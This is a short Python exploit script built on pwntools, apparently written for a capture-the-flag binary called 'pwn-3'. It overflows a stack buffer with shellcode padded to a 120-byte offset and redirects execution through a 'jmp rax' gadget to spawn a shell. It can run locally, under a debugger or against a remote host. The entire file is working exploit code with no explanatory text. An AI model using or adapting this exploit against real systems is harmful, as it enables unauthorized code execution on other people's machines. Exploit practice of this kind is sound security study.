from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./pwn-3"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
offset = 120

jmp_rax = 0x40111C

shellcode = asm(shellcraft.sh())
shellcode += asm(shellcraft.exit())

payload = shellcode
payload = payload.ljust(offset, b"\x90")
payload += p64(jmp_rax)

io.sendline(b"2")
io.sendline(payload)

io.interactive()
